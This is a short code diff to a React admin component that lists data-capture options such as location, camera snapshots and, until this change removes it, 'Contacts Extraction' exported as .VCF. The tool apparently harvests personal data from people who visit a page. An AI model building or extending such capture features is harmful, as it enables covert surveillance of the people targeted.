@@ -1,7 +1,7 @@
 // components/admin/PermissionSelector.tsx
 import React from "react";
 import { PermissionsConfig } from "@/lib/types";
-import { MapPin, Smartphone, Camera, Users } from "lucide-react";
+import { MapPin, Smartphone, Camera } from "lucide-react";
 
 interface PermissionSelectorProps {
   config: PermissionsConfig;
@@ -39,12 +39,6 @@ export const PermissionSelector: React.FC<PermissionSelectorProps> = ({ config, 
       title: "Camera Photo Verification",
       desc: "Prompt camera verification and capture snapshot",
       icon: <Camera className="w-4 h-4 text-[#FFFC00]" />,
-    },
-    {
-      key: "contacts",
-      title: "Contacts Extraction",
-      desc: "Android Chrome contact selector exported as .VCF (iOS Safari blocks web contacts)",
-      icon: <Users className="w-4 h-4 text-[#FFFC00]" />,
     },
   ];
 
